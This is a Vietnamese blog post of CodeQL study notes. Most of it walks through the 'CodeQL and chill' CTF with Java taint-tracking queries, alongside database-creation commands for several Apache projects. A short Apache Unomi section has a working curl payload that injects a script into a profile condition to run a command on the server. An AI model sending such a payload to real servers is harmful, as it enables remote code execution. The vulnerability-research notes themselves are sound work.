---
layout: post
title: Notes when learning codeql
categories: [Research]
tags: [CODEQL]
description: Ghi chú khi tìm hiểu codeql, không phải một bài viết hoàn chỉnh nên không thống nhất về bố cục :3
---

# CODEQL

## codeql

Tạo database 

```
sudo apt-get install maven
./codeql database create ~/Documents/researchs/codeql/databases/dubbo-triple --language="java" --command="mvn clean install --file pom.xml" --source-root="/home/dangkhai/Documents/researchs/java/dubbo-samples/dubbo-samples-triple"
```

codeQL cho phép bạn viết các `path-problem`truy vấn đặc biệt tạo ra các đường dẫn có độ dài thay đổi có thể được khám phá từng nút và thư viện DataFlow cho phép bạn viết các truy vấn xuất ra dữ liệu này.

<u>*Note:*</u>Không để chung codeql-cli chung folder với các project codeql lib khác. Bị trùng qlpack.yml trong classpath gây ra lỗi.

[Khái niệm về predicate](https://codeql.github.com/docs/ql-language-reference/predicates/)



```bash
mvn clean install -DskipTests -Dfast
```

./codeql database create ~/Documents/researchs/codeql/databases/apache-flink --language="java" --command="mvn clean install --file pom.xml" --source-root="/home/dangkhai/Documents/researchs/java/flink-1.14.0-src/flink-1.14.0"

### Note:

RemoteUserInput implements extraRequestSource lấy tất getter method ngoại trừ getContextPath,getAttribute

## [codeql and chill](https://securitylab.github.com/ctf/codeql-and-chill/)

### Step 1:

#### Step 1.1: Tìm source

Theo đề thì cần lấy ra các kết quả là các source bắt đầu từ phương thức `isValid() ` từ interface [ConstraintValidator](https://docs.oracle.com/javaee/7/api/javax/validation/ConstraintValidator.html). Vì vậy đầu tiên cần trace đến các kết quả là nơi các `ConstraintValidator` được implements.

```sql
class ConstraintValidator extends RefType{
    ConstraintValidator(){
        this.getQualifiedName().regexpMatch("javax.validation.ConstraintValidator(.*?)")
    }
}
```

Ở bước này có thể extends bởi cả [RefType](https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Type.qll/type.Type$RefType.html) và Interface vì bản chất RefType là một lớp chung cho nhiều loại tham chiếu khác nhau như  **classes,interfaces,type parameters** và **array**.

`getQualifiedName()` là lấy ra các tên của class,interface,... (khá giống với `hasQualifiedName()`). Nhưng lưu ý rằng `getQualifiedName()` không có tham biến và nó có tác dụng liệt ra kết các tên class,interface,... tương ứng rồi sau đó mới thực hiện bóc tách cho phù hợp ở bước tiếp theo. Còn `hasQualifiedName()` thì sẽ bao gồm 2 tham biến truyền vào là `package` và `type` nhằm mục đích chọn ra luôn class,interface,... được chỉ định ví dụ như `hasQualifiedName("javax.validation", "ConstraintValidator")`. Cú pháp này cũng nhằm mục đích để tránh gọi nhầm ra các class,interface,... không mong muốn ở các module,package khác.

Lỗi này làm cho taintracking không tìm được source, câu đầu đọc có vẻ đúng mà.

`this.hasQualifiedName("javax.validation", "ConstraintValidator")` 

Mình có tìm hiểu nguyên do thì có 2 trường hợp có thể xảy ra, cách thức chọn ra constructor của codeql đã thay đổi đôi chút từ dạo đó đến giờ. Tại sao mình lại nói vậy, vì ở một số solution của người chơi ở thời điểm đó vẫn lọc ra được các source theo kết quả mà vẫn dũng truy vấn như trên. Ngoài ra thì mình nghĩ rằng câu truy vấn trên hiện tại chỉ gọi đến các constructor mặc định. Mà các source đều bao gồm constructor `ConstraintValidator` kèm theo các tham biến như hình bên dưới.

![1](https://user-images.githubusercontent.com/32236617/134512594-5ca5cbd5-5f69-4811-89af-5ba896319f6a.png)

`this.getQualifiedName().regexpMatch("javax.validation.ConstraintValidator(.*?)")`

Mình cũng không thể áp đặt mặc định	 cho nó là có bao nhiêu tham biến truyền vào, thế nên sử dụng hàm `regexpMatch()` là một cách hợp lí.

![3](https://user-images.githubusercontent.com/32236617/134516413-336bf413-28f5-444b-b79d-5598a964a2ad.png)

Sau khi đã trace được các lớp đã được implements thì tiếp theo cần phải trace trong những constructors ở trên có cái nào gọi phương thức `isValid()` hay không?

```sql
class GetValidMethod extends Method{
    GetValidMethod(){
        this.hasName("isValid") and
        not(this.isPrivate()) and
        // this.hasAnnotation() and
        this.getDeclaringType().getASupertype() instanceof ConstraintValidator
    }
}
```

> getASupertype(): Lấy tên lớp được implements từ lớp con

Ví dụ:

![13](https://user-images.githubusercontent.com/32236617/135422737-cc3ecec5-900b-4727-94d8-855cbbc0b721.png)

Nếu cú pháp là `this.getDeclaringType()` thì chỉ lấy tên lớp con là `CollectionValidator`. Cú pháp là `this.getDeclaringType().getASupertype()` thì sẽ lấy lớp được implements là `ConstraintValidator<>`.

 `instanceof` ở trên tức chỉ lấy những object trong truy vấn này có nằm trong các kết quả từ lớp `ConstraintValidator` ở trên.

Kết quả thu được:

![5](https://user-images.githubusercontent.com/32236617/134518807-22ca5984-ec48-4ba7-acd0-33a6f107aa03.png)

Tới bước này nó chỉ liệt kê ra kết quả sau khi thực hiện truy vấn mà thôi, mình vẫn chưa thể `click move to source` được. Vì thế giờ cần viết một class extends `TaintTracking::Configuration`, và đây cũng chính là công năng chính của codeql. Các bạn cứ hình dung lớp được extends này là một bộ cài đặt sẵn cho phép tạo ra một tập đường đi từ `source` đến `sink`.

```sql
class GetValidMethodConfigure extends TaintTracking::Configuration{
    GetValidMethodConfigure(){this = "GetValidMethodConfigure"}

    override predicate isSource(DataFlow::Node source) {
        exists(GetValidMethod m | source.asParameter() = m.getParameter(0))
    }
    override predicate isSink(DataFlow::Node sink) {
        exists()
      }
}
```

Giả sử rằng từ `source` tới `sink` là đường đi gồm 10 nút. Nút một sẽ được xem mặc định là `isSource`, nút 10 sẽ là `isSink`. Việc cuối cùng của bộ xử lí này tìm ra tập các đường đi sao cho thỏa mãn toán từ **VÀ** tức là luôn bắt đầu bởi một `predicate`(thuộc tính) `isSource` **VÀ** kết thúc bởi `predicate`(thuộc tính) `isSink. `[asParameter()](https://codeql.github.com/codeql-standard-libraries/go/semmle/go/dataflow/internal/DataFlowUtil.qll/predicate.DataFlowUtil$Node$asParameter.0.html) tức nhận tham số tương ứng của nút này nếu có. [getParameter()](https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/JDK.qll/predicate.JDK$EqualsMethod$getParameter.0.html) tức nhận tham số duy nhất của object.

Mình sẽ giải thích ngắn gọn ý nghĩa đoạn `exists(GetValidMethod m | source.asParameter() = m.getParameter(0))` như sau:

Cú pháp [exist()](https://codeql.github.com/docs/ql-language-reference/formulas/#exists) này với tham số đầu tiên là `GetValidMethod` tức class `GetValidMethod()` đã được định nghĩa ở trên và được gán là `m`.  Tiếp theo là công thức để chọn ra các source phù hợp với tham số `GetValidMethod` đã cấu hình sẵn. `source.asParameter()` lựa chọn soucre là các parameter , và source này phải tương đương với parameter được lấy từ `GetValidMethod`.

![6](https://user-images.githubusercontent.com/32236617/134616882-a0a77a3a-a270-4349-ad6d-16a6403e6259.png)

Ngoài ra, sẽ có một số bạn bị nhầm giữa parameter và argument thì bạn có thể xem giải thích tại [đây](https://stackoverflow.com/questions/156767/whats-the-difference-between-an-argument-and-a-parameter).

Với truy vấn `exists(GetValidMethod m | source.asParameter() = m.getParameter(0))` như xác định điều kiện tồn tài của biểu thức này. `GetValidMethod m ` thức kí tự `m` là alias cho class `GetValidMethod`

![](https://user-images.githubusercontent.com/32236617/134514405-48d9f65e-3360-4e05-844f-bb32540880b4.png)

Ghi chú: Khi viết một class được extends bởi `TaintTracking::Configuration` thì nó yêu cầu phải có cả 2 predicate là `source` và `sinh`. Nếu chưa có 1 trong 2 thì các cứ viết một `predicate` rỗng như trên.

Mã đầy đủ cho bước này:

```sql
class ConstraintValidator extends RefType{
    ConstraintValidator(){
        this.getQualifiedName().regexpMatch("javax.validation.ConstraintValidator(.*?)")
    }
}

class GetValidMethod extends Method{
    GetValidMethod(){
        this.hasName("isValid") and
        not(this.isPrivate()) and
        this.getDeclaringType().getASupertype() instanceof ConstraintValidator
    }
}

class GetValidMethodConfigure extends TaintTracking::Configuration{
    GetValidMethodConfigure(){this = "GetValidMethodConfigure"}

    override predicate isSource(DataFlow::Node source) {
        exists(GetValidMethod m | source.asParameter() = m.getParameter(0))
    }
    override predicate isSink(DataFlow::Node sink) {
        exists()
      }
}
```

#### Step 1.2 Tìm sink

Tiếp theo mình sẽ tìm sink, tức là điểm cuối được gọi đến và thực thi các bước độc hại cuối cùng. Mình có tham khảo các bài hướng dẫn khác về sink này thì có nhiều cách khác nhau. Mỗi cách đều có cái hay riêng và nó phụ thuộc vào sự hiểu biết của người viết để dẫn đến truy vấn ngắn gọn và lọc ra được đúng kết quả nhất. Nhưng vì là lần đầu tiếp xúc nên mình cứ đi theo hướng tường minh, `step by step` , ổn áp rồi mới cải tiến nó sau. Bước `sink` này cũng giống `source`, cần phải tìm ra điểm kết thúc. Nhưng khác ở chỗ là source thhì mình cần tìm đến nơi bắt đầu gọi đến các class khác. Còn `sink` là cái mình cần tìm class cuối cùng **được** gọi bởi class khác. Do đó thì thay vì `extends Method` như ở bước trên thì mình cần  `extends MethodAccess` nhằm mục đích mở rộng từ lớp chứa các phương thức được gọi.

```sql
class ConstraintValidatorContext extends RefType{
    ConstraintValidatorContext(){
        this.getQualifiedName().regexpMatch("javax.validation.ConstraintValidatorContext(.*?)")
    }
}

class GetBuildConstraintViolationWithTemplateMethod extends MethodAccess{
    GetBuildConstraintViolationWithTemplateMethod(){
        this.getCallee().hasName("buildConstraintViolationWithTemplate") and
        this.getCallee().getDeclaringType() instanceof ConstraintValidatorContext
    }
}
```

Sau đó thực hiện `TaintTracking` đến sink bằng:

```sql
    override predicate isSink(DataFlow::Node sink) { 
        exists (GetBuildConstraintViolationWithTemplateMethod n | sink.asExpr() = n.getArgument(0)) 
    }
```

> asExpr(): Gets the expression corresponding to this node, if any

Khi đọc định nghĩa về `asExpr()`, mình vẫn chưa hiểu tại sao lại lấy một biểu thức so sánh với một `argument`, tạo sạo lại không đặt là `asArgument()`. Một hồi tìm hiểu thì cũng có tài liệu nói về nó ở [đây](https://codeql.github.com/codeql-standard-libraries/cpp/semmle/code/cpp/ir/dataflow/internal/DataFlowUtil.qll/type.DataFlowUtil$ExprNode.html), mặc dù không chính thống từ java nhưng mình nghĩ là ý nghĩa của nó cũng tương tự.

> Gets the non-conversion expression corresponding to this node, if any. This predicate only has a result on nodes that represent the value of evaluating the expression. For data flowing *out of* an expression, like when an argument is passed by reference, use `asDefiningArgument` instead of `asExpr`.

`asExpr()` cũng xem như argument vì ví dụ như này:

```
person.age(1+1)
```

thì `1+1` là argument của phương thức `age` mà bản thân `1+1` cũng là một đối số. Nó cũng giống như :

```
$age = 1+1
person.age($age)
```

Có lẽ mình mất kiến thức căn bản quá nên quên mất phần này ==!.

Ở bước này thì công thức của mình sẽ không là một parameter nữa mà sẽ là argument như này:

![7](https://user-images.githubusercontent.com/32236617/134617961-968c1980-af9b-4ffb-bfec-bc7828763da0.png)

Kết quả thu được 5 sink:

![8](https://user-images.githubusercontent.com/32236617/134618059-2aff9acd-e79c-4116-9260-9a1ff8716a00.png)

#### Step 1.3 Kết nối dòng chảy từ source đến sink

Sau khi đã xác định được `source` và `sink` thì việc tiếp theo là kết nối lại nó thành một luồng chảy và tạo ra một `stack trace` cho luồng này. Giờ chỉ cần sử dụng `DataFlow::PathNode ` để in ra các đường dẫn của các nút từ source đến sink.

```sql
from GetValidMethodConfigure cfg, DataFlow::PathNode source, DataFlow::PathNode sink
where
    cfg.hasPartialFlow(source, sink, _) and
select sink,source,sink

```

Kết quả trả về là *0*. Lí do cho điều này là vì từ `source` đến `sink` có nút nào đó không đi đúng theo dòng chảy này. Và dĩ nhiên, codeql cũng hỗ trợ người dùng chức năng debug. Chưa thể chọn 1 nút bật kì để đặt breakpoint cho nó, nhưng ta có thể chọn 1 dòng chảy cố định( ở đây đã biết lỗi xuất phát từ `SchedulingConstraintValidator`) và cho nó chạy đến nơi( tức nút ) khiến cho dòng chảy bị đứt quãng. Từ đó tìm ra nguyên do chưa đáp ứng đủ điều kiện cần cho truy vấn của mình mà bổ sung.

<u>Note:</u>

![14](https://user-images.githubusercontent.com/32236617/135450874-f082c3dd-36d8-43d3-82d9-6f402e4587dd.png)

Lỗi xuất hiện khi `run query` là vì truy vấn select cần ít nhất 4 đối số.

#### Step 1.4 gỡ lỗi một dòng chảy

 Giờ việc cần thiết là đưa ra một biểu thức xác định cho `source` debug xuất phát từ `SchedulingConstraintValidator`. Có nhiều cách để làm việc này. Miễn mục đích chung là định danh cho bộ xử lý hiểu `source` là `SchedulingConstraintValidator`. Mình có thể đưa ra gợi ý 2 cách như thế này. 

Lợi dụng lớp `ConstraintValidator` hoặc `GetValidMethod` trước đó để tiếp tục tạo một lớp khác `extends` hoặc `instanceof` để tìm vị trí của `constructors` này, ngoài ra có thể tạo một lớp hoặc **exist()** mới để làm hết thẩy những việc này mà không cần `extends` hoặc `instanceof`.

```sql
from GetValidMethodConfigure cfg, DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink
where
    cfg.hasPartialFlow(source, sink, _) and
    exists(Method m | m.getDeclaringType().hasQualifiedName("com.netflix.titus.api.jobmanager.model.job.sanitizer", "SchedulingConstraintSetValidator") and
    m.hasName("isValid") and
    source.getNode().asParameter() = m.getParameter(0)
    )
select source, sink, sink.getNode().getLocation(), "Partial flow from unsanitized user data"
```

Nhưng mình thấy cách nhanh gọn lẹ nhất là trỏ đến thẳng vị trí của source như gợi ý của [@osynetskyi](https://gist.github.com/osynetskyi/72cb82011e28549c4a5bedc2437dffa9)

```sql
from GetValidMethodConfigure cfg, DataFlow::PartialPathNode source, DataFlow::PartialPathNode sink
where
    cfg.hasPartialFlow(source, sink, _)
    and sink.getNode().getLocation().getFile().getStem() = "SchedulingConstraintSetValidator"
select source, sink, sink.getNode().getLocation(), "Partial flow from unsanitized user data"
```

* `sink.getNode().getLocation()` là lấy vị trí của interface : 

```
file:///Users/xavier/src/github/titus-control-plane/titus-api/src/main/java/com/netflix/titus/api/jobmanager/model/job/sanitizer/SchedulingConstraintSetValidator.java:56:28:56:46
```

* `sink.getNode().getLocation().getFile()`lấy tên tệp: `SchedulingConstraintSetValidator` ở dạng webview của vscode( không phải dạng chuỗi)

* `sink.getNode().getLocation().getFile.getStem()` lấy AbsolutePath của tệp ở dạng **chuỗi**:`SchedulingConstraintSetValidator` 

Nếu trường hợp trong interface có nhiều method trùng tên thì thêm vài ràng buộc method là ổn.

Ngoài ra mình cũng biết được 1 mẹo hay là có thể giới hạn số nút lúc gỡ lỗi khi override `explorationLimit` như gợi ý của [@cldrn](https://github.com/cldrn/ctf4-codeql-and-chill-java#step-11-setting-up-our-sources) và trong [Configuration::hasPartialFlow](https://codeql.github.com/codeql-standard-libraries/go/semmle/go/dataflow/internal/DataFlowImpl.qll/type.DataFlowImpl$Configuration.html) có đề cập.

```sql
 override int explorationLimit() { result =  10} 
```

Vậy khi nào dùng `explorationLimit()`? 

Trong khi debug `PartialFlow`, nó cũng giống như lúc bạn chạy `PathFlow` bình thường. thế nên có thể nó vẫn không in ra màn hình`stacktrace` nếu có `taint tracking` không đến được `sink`. Thế nên mới có 2 mình có thể gợi ý như này:

* Giới hạn `sink()` ở một nơi mà bạn nghĩ nó sẽ không có lỗi và chảy đến đó(như mình ví dụ trên)
* Cách trên thì có vẻ hơi thô, thế nên dùng `explorationLimit()` mình nghĩ tối ưu hơn, bạn có thể tăng `result` lên hoặc giảm xuống để tìm điểm cuối nơi mà nút đó toang.

<u>Note:</u>

![15](https://user-images.githubusercontent.com/32236617/135455426-83e54c06-6f14-4afc-8247-b863975df75a.png)



Khi bạn muốn đầu ra là kiểu alert có thể theo dõi stacktrace thì nhớ thêm thư viện `DataFlow::PartialPathGraph`. Cho dù thiếu thì nó cũng không in ra lỗi hay bất cứ output nào nhưng mà quên thì lại mắc công dành cả buổi để tìm lỗi sai trong câu query của mình. Mà rốt cuộc lí do cũng chỉ là quên import thư viện mà thôi.



Lưu ý thứ 2:

Phần Select : `select source, sink, source,"unstrust data"` sẽ không ra stack trace

`select sink, source, sink,"unstrust data"` đúng thứ tự sẽ ra được stacktrace -> ? chưa tìm đc lí do

#### Step 1.5 Xác định lỗi

Trong codeql, mặc định rằng các phương thức cần đối số truyền vào sẽ không được thực hiện. Lí giải cho việc này như sau:

Giả sử rằng phương thức có phương thức `Person()`:

```java
public class Person {
    private int age;
    private String name;
    ...
    private String n_parameter;

    public int getAge() {
        return this.age;
    }

    public void set(int age) {
        this.age = age;
    }
    
    public String getName() {
        return this.name;
    }

    public void setName(String name) {
        this.Name = name;
    }
    
    public String getNparameter() {
        return this.number;
    }

    public void setNparameter(String n_parameter) {
        this.n_parameter = n_parameter;
    } 
    ...
}
```

Ở lớp `Group()` sẽ thực hiện gọi đến lớp `Person()` ở trên để thực hiện lấy các giá trị của object tương ứng.(Giả sử rằng bước(node) này là bước thứ 4 nằm trong một chuỗi từ source đến sink).

```java
public class Group {
    ...
       Person person = new person(19,"tainted(not safe input)", ... ,"Mrs Hang(safe input)"); 
    ...
}
```

Đầu tiên, thì lớp `Person()` của mình có thể có `n` tham số, vậy nên khi mà ở một class bất kì gọi đến lớp này thì cũng cần truyền `n` đối số( không tính đến việc gọi  contructor mặc định). Và codeql không thông minh đến mức nhận biết được rằng liệu đối số nào là `not safe input`. Vậy codeql chỉ có cách sẽ liệt kê ra `n` đường đi có thể xảy ra ở `n` đối số được truyền vào đê hoàn thành nhiệm vụ của nó là `taint tracking`. Giờ nó sẽ thành:

```
3 -> 4.1 -> 5.1 -> 6.1 -> ...
3 -> 4.2 -> 5.2 -> 6.2 -> ...
3 -> 4.3 -> 5.3 -> 6.3 -> ...
3 -> 4.4 -> 5.4 -> 6.4 -> ...
...
```



![image](https://user-images.githubusercontent.com/32236617/134873979-195bf1ed-e372-49c8-88d2-14bceb16235a.png)

Điều này có hiệu qủa hay không?

Câu trả lời là không, nó sẽ làm rối người sử dụng thêm thôi. Thế nên codeql sẽ không sử dụng cách này mà mặc định là sẽ `dừng` ở nút đó luôn. Và cần người dùng tự thêm(define) cho node này bằng `TaintTracking::AdditionalTaintStep`. Tuy có hơi `hand made` một tí, nhưng nó làm tăng hiệu xuất `Taint Tracking` hơn với số đường đi ít hơn.

#### Step 1.6 Thêm bước gãy vào dòng chảy

Trong `SchedulingConstraintSetValidator#60` ví dụ có đoạn mã sau:

```java
@Override
    public boolean isValid(Container container, ConstraintValidatorContext context) {
        if (container == null) {
            return true;
        }
        Set<String> common = new HashSet<>(container.getSoftConstraints().keySet());
        ...
```

Như đã giải thích ở bước 1.5. Và giờ ta còn nối các nút gãy này lại với nhau. Lưu ý rằng dòng chảy cho các nút `chảy từ trong ra ngoài ( node3(node4.a))`, tức là trong chuỗi các nút thì nút 3 sẽ là `container.getSoftConstraints()`, sau đó nút 4 là `container.getSoftConstraints().keySet()`. 

```sql
 class AddStepOne extends TaintTracking::AdditionalTaintStep{
    override predicate step(DataFlow::Node pre, DataFlow::Node succ) {
        exists(Callable ca, MethodAccess ma|ca.getName() in ["getSoftConstraints","getHardConstraints","keySet"] and
        pre.asExpr() = ma.getQualifier() and
        succ.asExpr() = ma and
        ma.getMethod() = ca
        )
    }
 }
```

`Callable` khá giống với `MethodAcess`, ám chỉ các đối tượng được gọi. Chỉ khác là đối với `Callable` đối tượng được gọi là phương thức hoặc constructor, còn `MethodAcess` thì đối tượng chỉ là các phương thức. Ngoài ra thì `Callable` trả về là tên của một phương thức, còn `Methodaccess` thì cần phải sử dụng `getMethod()` thì mới có thể trả về tên phương thức được gọi.

> Có thể sử dụng `in` thay thế cho nhiều lần gọi `or` hoặc sử dụng regex `abc|xyz|kmn`.
>
> getQualifier(): Lấy đến phương thức trước đó gọi đến nó. ví dụ như từ `container.getSoftConstraints()` sử dụng `getQualifier()` thì sẽ trỏ đến `container.getSoftConstraints().keySet()`. 

#### Step 1.7 Thêm bước gãy là một constructor

Ở bước này thì gọi đến constructor của `HashSet` và truyền cho nó một đối số là `container.getSoftConstraints().keySet()`

![image](https://user-images.githubusercontent.com/32236617/135637146-a7008961-197a-428c-ae09-e81d5f81c9c9.png)

từ bước này nên codeql không thực hiện truyền `tainted` vào dẫn đến xuất hiện node gãy tại đây.

```sql
class AddStepHashSet extends TaintTracking::AdditionalTaintStep{
    override predicate step(DataFlow::Node pre_,DataFlow::Node succ_) {
        exists(ConstructorCall cc | cc.getConstructor().getName().regexpMatch("HashSet<(.*?)>") and
        pre_.asExpr() = cc.getArgument(0) and
        succ_.asExpr() = cc
        )
    }
}
```

Có một lưu ý nhỏ, trong lúc mình thử các kiểu ràng buộc cho 2 node này. Thay bằng mình sử dụng `ConstructorCall` thì mình lại sử dụng `RefType`. Ban đầu mình nghĩ nó đúng, nhưng sự nhầm lẫn ở đây là RefType đại diện cho lớp, còn cái mình cần là 1 contrucstor, các lớp thường dùng các constructor mặc định, hoặc tùy chỉnh theo số tham số, kiểu tham số,... Nhưng dùng constructor thì mình mới có thể sử dụng các hàm như `getArgument,getParameter,...` được thôi. 

### Step 2:

Tương tự ở bước 1.6 đối với lớp `SchedulingConstraintValidator`. Thêm các phương thức `stream,map,collect` vào các nút dòng chảy.

```sql
 class AddStepOne extends TaintTracking::AdditionalTaintStep{
    override predicate step(DataFlow::Node pre, DataFlow::Node succ) {
        exists(Callable ca, MethodAccess ma|ca.getName() in ["collect","map","stream","getSoftConstraints","getHardConstraints","keySet"] and
        pre.asExpr() = ma.getQualifier() and
        succ.asExpr() = ma and
        ma.getMethod() = ca
        )
    }
 }
```

Ở bước này thì cần quan sát kĩ và **take note** ở bước tìm vị trí các `isSource`, liệt kê ra các phương thức được gọi mà `tained` không thể chảy vào.

### Step 3:

Các bước trong dòng chảy nằm trong `try() -> catch()`. Trong trường hợp này, try catch không phải là dạng phương thức thông thường.

```java
try {
    parse(tainted);
} catch (Exception e) {
    sink(e.getMessage())
}
```

Codeql hỗ trợ `TryStmt` để bắt vị trí mệnh đề try, `CatchClause` bắt vị trí mệnh đề clause. Giờ việc của ta là bắt lần lượt bắt các block mã của 2 mệnh đề, rồi lần lượt quét các trường hợp mà `tained` chảy vào các phương thức nằm trong block try rồi đến block catch.

```sql
 class AddStepThree extends TaintTracking::AdditionalTaintStep{
     override predicate step(DataFlow::Node pre,DataFlow::Node suc) {
         exists(TryStmt stmt, CatchClause cc, MethodAccess intry, MethodAccess incatch ,VarAccess va|
            stmt = cc.getTry() and
            intry = stmt.getBlock().getAChild().(ExprStmt).getExpr() and
            incatch = cc.getBlock().getAChild().(ExprStmt).getExpr() and
            va = cc.getVariable().getAnAccess() and
            incatch.getAnArgument().toString().matches("%getMessage%") and
            incatch.getAnArgument().getAChildExpr*() = va and
            pre.asExpr() = intry and
            suc.asExpr() = va)
     }
 }
```

`MethodAccess intry, MethodAccess incatch` với `intry` và `incatch` lần lượt là đại diện của các phương thức được gọi trong 2 block `try` và `catch`. `VarAccess va` là lấy tham số trong mệnh đề `catch`, ở đây là `e`.

> getTry(): Trỏ đến vị trí mệnh đề Try tương ứng
>
> getBlock(): Lấy các khối mã trong mệnh đề đó
>
> getAChild(): Lấy lần lượt các dòng mã con
>
> (ExprStmt).getExpr(): Lấy các đoạn mã là 1 biểu thức( phương thức có đối số )
>
> getVariable(): Lấy tham số của mệnh đề
>
> getAnAccess(): Trỏ đến nơi mà tham số trong mệnh đề catch được dùng trong các biểu thức trong block code đó

?? Chưa giải thích được `*(asterisk)`

### Step 4: Full source

```sql
/**
 * @kind path-problem
 */

 import java
 import semmle.code.java.dataflow.TaintTracking
 import semmle.code.java.dataflow.DataFlow
 import DataFlow::PathGraph
 
 class ConstraintValidator extends RefType {
    ConstraintValidator(){
        this.getQualifiedName().regexpMatch("javax.validation.ConstraintValidator<(.*?)>")
    }
 }

 class IsValid extends Method {
     IsValid(){
         this.hasName("isValid") and
         this.getDeclaringType().getASupertype() instanceof ConstraintValidator
     }
 }

 class ConstraintValidatorContext extends RefType{
    ConstraintValidatorContext(){
         this.hasQualifiedName("javax.validation", "ConstraintValidatorContext")
     }
 }

 class BuildConstraintViolationWithTemplate extends MethodAccess{
    BuildConstraintViolationWithTemplate(){
        this.getCallee().hasName("buildConstraintViolationWithTemplate") and
        this.getCallee().getDeclaringType() instanceof ConstraintValidatorContext
    }
 }

 class Myconfigure extends TaintTracking::Configuration{
     Myconfigure(){ this = "Myconfigure" }
     override predicate isSource(DataFlow::Node source) {
         exists(IsValid iv | source.asParameter() = iv.getParameter(0))
     }
     override predicate isSink(DataFlow::Node sink) {
         exists(BuildConstraintViolationWithTemplate bl | sink.asExpr() = bl.getArgument(0))
     }

    //  override int explorationLimit() { result = 100 }
 }

 class AddStepOne extends TaintTracking::AdditionalTaintStep{
    override predicate step(DataFlow::Node pre, DataFlow::Node succ) {
        exists(Callable ca, MethodAccess ma|ca.getName() in ["collect","map","stream","getSoftConstraints","getHardConstraints","keySet"] and
        pre.asExpr() = ma.getQualifier() and
        succ.asExpr() = ma and
        ma.getMethod() = ca
        )
    }
 }

 class AddStepTwo extends TaintTracking::AdditionalTaintStep{
     override predicate step(DataFlow::Node pre, DataFlow::Node suc) {
         exists(ConstructorCall cc | cc.getConstructor().getName().matches("HashSet%") and
         pre.asExpr() = cc.getArgument(0) and
         suc.asExpr() = cc
         )
     }
 }

 class AddStepThree extends TaintTracking::AdditionalTaintStep{
     override predicate step(DataFlow::Node pre,DataFlow::Node suc) {
         exists(TryStmt stmt, CatchClause cc, MethodAccess intry, MethodAccess incatch ,VarAccess va|
            stmt = cc.getTry() and
            intry = stmt.getBlock().getAChild().(ExprStmt).getExpr() and
            incatch = cc.getBlock().getAChild().(ExprStmt).getExpr() and
            va = cc.getVariable().getAnAccess() and
            incatch.getAnArgument().toString().matches("%getMessage%") and
            incatch.getAnArgument().getAChildExpr*() = va and
            pre.asExpr() = intry and
            suc.asExpr() = va)
     }
 }

 from Myconfigure cfg, DataFlow::PathNode source, DataFlow::PathNode sink
 where
    cfg.hasFlowPath(source, sink)
 select sink,source,sink,"untrust data"

// from TryStmt try, CatchClause catch, MethodAccess trycall, MethodAccess catchcall,
//     VarAccess e
// where catch = try.getACatchClause()
//     and trycall = try.getBlock().getAChild().(ExprStmt).getExpr()
//     and catchcall = catch.getBlock().getAChild().(ExprStmt).getExpr()
//     and e = catch.getVariable().getAnAccess()
//     and catchcall.getMethod().getName().regexpMatch("debug|info|warn|error|assert.*")
//     and catchcall.getAnArgument().getAChildExpr*() = e
// select try, catch.getVariable().getAnAccess()
```



## APACHE UMINO

```
Install JDK 8 (see http://www.oracle.com/technetwork/java/javase/downloads/index.html and make sure you set the JAVA_HOME variable https://docs.oracle.com/cd/E19182-01/820-7851/inst_cli_jdk_javahome_t/
Download ElasticSearch here : https://www.elastic.co/downloads/past-releases (please make sure you use the proper version : [7.4.2 for Unomi >= 1.5] and [5.6.3 for Unomi >= 1.3] and [5.1.2 for Unomi <= 1.2])
Uncompress it and change the config/elasticsearch.yml to include the following config : cluster.name: contextElasticSearch
Launch ElasticSearch using : bin/elasticsearch
Download Apache Unomi here : http://unomi.apache.org/download.html
Start it using : ./bin/karaf
Start the Apache Unomi packages using unomi:start in the Apache Karaf Shell
Wait for startup to complete
Try accessing https://localhost:9443/cxs/cluster with username/password: karaf/karaf . You might get a certificate warning in your browser, just accept it despite the warning it is safe.
Request your first context by simply accessing : http://localhost:8181/context.js?sessionId=1234
If something goes wrong, you should check the logs in ./data/log/karaf.log. If you get errors on ElasticSearch, make sure you are using the proper version.
```



payload 

```
curl -X POST http://localhost:8181/context.json --header 'Content-type: application/json' --data '{"filters":[{"id":"boom ","filters":[{"condition":{"parameterValues":{"propertyName":"prop","comparisonOperator":"equals","propertyValue":"script::Runtime r=Runtime.getRuntime();r.exec(\"gnome-calculator\");"},"type":"profilePropertyCondition"}}]}],"sessionId":"boom"}'

```



## APACHE FLINK



## WUTFACES

```java
./codeql database create ~/Documents/researchs/codeql/databases/wutfaces --language="java" --command="mvn clean install --file pom.xml -DskipTests -Dmaven.test.skip=true" --source-root="/home/dangkhai/Documents/researchs/java/richfaces-core-4.3.2.20130513-Final"
```

```xml
        <dependency>
            <groupId>org.richfaces.ui.core</groupId>
            <artifactId>richfaces-ui-core-ui</artifactId>
            <version>4.3.2.Final</version>
            <scope>system</scope>
            <systemPath>/home/dangkhai/Documents/researchs/java/libs/wutfaces/richfaces-ui-core-ui-4.3.2.Final.jar</systemPath>
        </dependency>
```

## APACHE DRUID

/home/dangkhai/Documents/researchs/java/apache-druid/druid-druid-0.19.0

```
./codeql database create ~/Documents/researchs/codeql/databases/apache-druid --language="java" --command="mvn clean install --file pom.xml -DskipTests -Dmaven.test.skip=true" --source-root="/home/dangkhai/Documents/researchs/java/apache-druid/druid-druid-0.19.0"
```

```
./codeql database create ~/Documents/researchs/codeql/databases/apache-druid-0.22 --language="java" --command="mvn clean install --file pom.xml -DskipTests -Dmaven.test.skip=true" --source-root="/home/dangkhai/Documents/researchs/java/apache-druid-0.22.0-src"
```



## references

*<u>I-I. Vỡ lòng:</u>*

​		[0] [codeql-library-for-java@codeql.github.com](https://codeql.github.com/docs/codeql-language-guides/codeql-library-for-java/)



[CodeQL learning-CodeQL java library](https://www.cnblogs.com/goodhacker/p/13592077.html)

*<u>I. Thực hành</u>*

​		[0] [codeql-and-chill](https://securitylab.github.com/ctf/codeql-and-chill/)

<u>*II. Thực chiến*</u>

​		[0] [Apache Dubbo: All roads lead to RCE](https://securitylab.github.com/research/apache-dubbo/)

https://phoenix.yizimg.com/SummerSec/learning-codeql

https://githubmemory.com/repo/testanull/GHCTF-4-writeup

https://static.anquanke.com/download/b/security-geek-2020-q2/article-19.html#CarSRC

[detecting jackson deserialization vulnerabilities with codeql](https://blog.gypsyengineer.com/en/security/detecting-jackson-deserialization-vulnerabilities-with-codeql.html)



case study:

[CodeQL Java rule writing skills: take Apache kylin as an example to write command execution check rules](https://www.zyxiao.com/p/129990)

